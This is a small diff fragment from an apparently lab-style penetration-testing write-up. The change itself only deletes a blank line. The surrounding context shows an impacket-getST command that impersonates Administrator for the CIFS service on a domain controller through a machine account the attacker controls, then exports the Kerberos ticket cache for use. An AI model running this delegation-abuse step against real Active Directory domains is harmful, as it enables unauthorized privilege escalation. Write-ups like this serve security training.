@@ -49,7 +49,6 @@ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'Attacker
 export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
 ```
 
-
 ### References
 
 - _(none)_
